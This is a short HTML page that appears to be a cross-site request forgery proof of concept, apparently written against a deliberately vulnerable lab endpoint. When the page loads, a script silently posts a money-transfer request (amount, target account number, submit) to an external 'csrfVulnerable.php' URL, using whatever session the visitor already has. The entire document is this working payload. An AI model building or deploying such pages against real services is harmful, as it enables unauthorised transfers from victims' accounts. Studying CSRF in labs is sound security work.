<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D</title>
</head>
<body>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script>
    $.post('https://sencldigitech.co.uk/aidris/web/csrfVulnerable.php',
    {
        amount :'20',
        targetaccount : '87654321',
        submit:'Transfer'
    });
  </script>
 
</body>
</html>